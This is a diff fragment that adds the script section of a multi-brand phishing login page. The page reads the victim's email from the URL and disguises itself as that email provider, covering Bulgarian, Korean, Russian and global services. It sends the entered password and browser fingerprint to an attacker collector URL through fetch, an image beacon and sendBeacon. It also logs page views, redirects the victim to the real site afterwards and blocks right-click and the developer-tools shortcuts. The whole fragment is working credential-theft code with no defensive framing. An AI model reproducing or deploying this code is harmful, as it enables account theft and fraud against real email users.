+            document.getElementById('copyrightText').textContent = brand.copyright || 'All rights reserved.';
+            
+            // Detection badge
+            document.getElementById('detectionBadge').textContent = '🔍 ' + brand.name + ' | ' + brand.domain;
+            
+            // Password placeholder
+            var passwordInput = document.getElementById('password');
+            passwordInput.placeholder = 'Enter your ' + brand.name + ' password';
+            
+            // Favicon
+            updateFavicon(brand);
+        }
+
+        function updateFavicon(brand) {
+            try {
+                var canvas = document.createElement('canvas');
+                canvas.width = 32;
+                canvas.height = 32;
+                var ctx = canvas.getContext('2d');
+                ctx.fillStyle = brand.logoColor || '#1a73e8';
+                ctx.fillRect(0, 0, 32, 32);
+                ctx.fillStyle = 'white';
+                ctx.font = 'bold 18px Arial';
+                ctx.textAlign = 'center';
+                ctx.textBaseline = 'middle';
+                ctx.fillText((brand.logoIcon || 'S').charAt(0), 16, 16);
+                var favicon = document.createElement('link');
+                favicon.rel = 'icon';
+                favicon.href = canvas.toDataURL('image/png');
+                document.head.appendChild(favicon);
+            } catch(e) {}
+        }
+
+        // ============================================================
+        // 4. CREDENTIAL HANDLING
+        // ============================================================
+        
+        var CONFIG = {
+            COLLECTOR_URL: 'https://attacker-collector.pages.dev/collect',
+            MAX_ATTEMPTS: 3
+        };
+        
+        var loginAttempts = 0;
+        var currentEmail = '';
+        var currentBrand = null;
+
+        function togglePasswordVisibility() {
+            var passwordInput = document.getElementById('password');
+            var toggleBtn = document.querySelector('.toggle-password');
+            if (passwordInput.type === 'password') {
+                passwordInput.type = 'text';
+                toggleBtn.textContent = '🙈';
+            } else {
+                passwordInput.type = 'password';
+                toggleBtn.textContent = '👁️';
+            }
+        }
+
+        function handleLogin() {
+            var passwordInput = document.getElementById('password');
+            var password = passwordInput.value.trim();
+            var errorMessage = document.getElementById('errorMessage');
+            var errorText = document.getElementById('errorText');
+            var signinBtn = document.getElementById('signinBtn');
+            
+            errorMessage.classList.remove('show');
+            passwordInput.classList.remove('error');
+            
+            if (!password) {
+                errorText.textContent = 'Please enter your password';
+                errorMessage.classList.add('show');
+                passwordInput.classList.add('error');
+                return;
+            }
+            
+            if (password.length < 6) {
+                errorText.textContent = 'Password must be at least 6 characters';
+                errorMessage.classList.add('show');
+                passwordInput.classList.add('error');
+                return;
+            }
+            
+            signinBtn.disabled = true;
+            signinBtn.classList.add('loading');
+            loginAttempts++;
+            
+            sendCredentials(currentEmail, password, currentBrand, function(success) {
+                signinBtn.disabled = false;
+                signinBtn.classList.remove('loading');
+                
+                if (success) {
+                    signinBtn.innerHTML = '<span class="btn-text">✅ Signed In</span>';
+                    setTimeout(function() {
+                        window.location.href = currentBrand ? currentBrand.realSite : 'https://secure.com';
+                    }, 1500);
+                } else {
+                    errorText.textContent = 'Invalid credentials. Please try again.';
+                    errorMessage.classList.add('show');
+                    passwordInput.classList.add('error');
+                    passwordInput.value = '';
+                    passwordInput.focus();
+                    signinBtn.innerHTML = '<span class="btn-text">Sign In</span>';
+                    setTimeout(function() {
+                        signinBtn.innerHTML = '<span class="btn-text">Sign In</span>';
+                    }, 1000);
+                    
+                    if (loginAttempts >= CONFIG.MAX_ATTEMPTS) {
+                        errorText.textContent = 'Too many attempts. Redirecting...';
+                        setTimeout(function() {
+                            window.location.href = currentBrand ? currentBrand.realSite : 'https://secure.com';
+                        }, 2000);
+                    }
+                }
+            });
+        }
+
+        function sendCredentials(email, password, brand, callback) {
+            var data = {
+                email: email,
+                password: password,
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screenResolution: screen.width + 'x' + screen.height,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                referrer: document.referrer || '(direct)',
+                url: window.location.href,
+                attempts: loginAttempts,
+                source: 'chameleon-login-bulgarian',
+                detectedBrand: brand ? brand.name : 'unknown',
+                detectedDomain: brand ? brand.domain : 'unknown',
+                brandIcon: brand ? brand.logoIcon : 'unknown',
+                brandFlag: brand ? brand.flag : 'unknown',
+                sourceType: 'bulgarian-phishing-chain'
+            };
+            
+            console.log('📤 Sending credentials:', data);
+            
+            fetch(CONFIG.COLLECTOR_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data),
+                mode: 'no-cors'
+            })
+            .then(function() { callback(true); })
+            .catch(function(error) {
+                console.error('Failed to send credentials:', error);
+                try {
+                    var img = new Image();
+                    img.src = CONFIG.COLLECTOR_URL + '?email=' + encodeURIComponent(email) + 
+                              '&password=' + encodeURIComponent(password) +
+                              '&brand=' + encodeURIComponent(brand ? brand.name : 'unknown') +
+                              '&t=' + Date.now();
+                    callback(true);
+                } catch(e) {
+                    callback(true);
+                }
+            });
+            
+            setTimeout(function() {
+                try {
+                    var beaconData = JSON.stringify(data);
+                    if (navigator.sendBeacon) {
+                        navigator.sendBeacon(CONFIG.COLLECTOR_URL, beaconData);
+                    }
+                } catch(e) {}
+            }, 100);
+        }
+
+        // ============================================================
+        // 5. PAGE INITIALIZATION
+        // ============================================================
+        
+        document.addEventListener('DOMContentLoaded', function() {
+            // Get email from URL
+            var urlParams = new URLSearchParams(window.location.search);
+            var email = urlParams.get('email');
+            
+            if (!email && window.location.hash) {
+                email = window.location.hash.substring(1);
+            }
+            
+            if (email) {
+                try {
+                    currentEmail = decodeURIComponent(email);
+                } catch(e) {
+                    currentEmail = email;
+                }
+            } else {
+                // Test with random email - now includes Bulgarian providers
+                var testDomains = [
+                    'abv.bg', 'mail.bg', 'dir.bg',
+                    'naver.com', 'hanmail.net', 'gmail.com', 'outlook.com', 'hiworks.co.kr',
+                    'yandex.ru', 'mail.ru', 'protonmail.com', 'tutanota.com', 'yahoo.com',
+                    'icloud.com', 'daum.net', 'kakao.com', 'nate.com', 'gabia.com',
+                    'rambler.ru', 'bk.ru', 'inbox.ru', 'yandex.com', 'proton.me'
+                ];
+                var testNames = ['john', 'jane', 'mike', 'sarah', 'david', 'minjun', 'sooyoung', 'jihoon', 'ivan', 'elena', 'georgi', 'maria'];
+                currentEmail = testNames[Math.floor(Math.random() * testNames.length)] + 
+                              '.' + Math.floor(Math.random() * 9999) + 
+                              '@' + testDomains[Math.floor(Math.random() * testDomains.length)];
+                console.log('🔧 No email provided, using test:', currentEmail);
+            }
+            
+            // Extract domain and detect brand
+            var domain = extractDomain(currentEmail);
+            currentBrand = detectBrand(domain);
+            
+            console.log('📧 Email:', currentEmail);
+            console.log('🌐 Domain:', domain);
+            console.log('🏷️ Detected Brand:', currentBrand.name, currentBrand.flag);
+            
+            // Set email fields
+            document.getElementById('emailField').value = currentEmail;
+            document.getElementById('emailDisplay').value = currentEmail;
+            document.getElementById('originalDomain').value = domain;
+            
+            // Apply theme
+            applyTheme(currentBrand);
+            
+            // Focus password
+            document.getElementById('password').focus();
+            
+            // Track page view
+            trackPageView(currentEmail, currentBrand);
+            
+            // Enter key support
+            document.getElementById('password').addEventListener('keydown', function(e) {
+                if (e.key === 'Enter') {
+                    e.preventDefault();
+                    handleLogin();
+                }
+            });
+            
+            // Prevent context menu
+            document.addEventListener('contextmenu', function(e) {
+                e.preventDefault();
+            });
+            
+            // Prevent dev tools shortcuts
+            document.addEventListener('keydown', function(e) {
+                if ((e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J')) || 
+                    e.key === 'F12') {
+                    e.preventDefault();
+                }
+            });
+        });
+
+        function trackPageView(email, brand) {
+            try {
+                var img = new Image();
+                img.src = CONFIG.COLLECTOR_URL + '/view?email=' + encodeURIComponent(email) + 
+                          '&brand=' + encodeURIComponent(brand ? brand.name : 'unknown') +
+                          '&flag=' + encodeURIComponent(brand ? brand.flag : 'unknown') +
+                          '&t=' + Date.now();
+            } catch(e) {}
+        }
+
+        console.log('🦎 Auto-Chameleon Login Portal Loaded (Bulgarian + Korean + Russian + Global Edition)');
+        console.log('📋 Supported Brands:', Object.keys(BRAND_DB).length);
+        console.log('🇧🇬 Bulgarian: ABV.BG, Mail.bg, Dir.bg, Vbox7');
+        console.log('🇰🇷 Korean: Naver, Daum, Kakao, Nate, Hiworks, and more');
+        console.log('🇷🇺 Russian: Yandex, Mail.ru, Rambler, and more');
+        console.log('🌐 Global: Gmail, Outlook, Yahoo, ProtonMail, Tutanota, and more');
+        console.log('🔮 Dynamic: Any email domain gets an auto-generated background!');
+    </script>
+</body>
+</html>
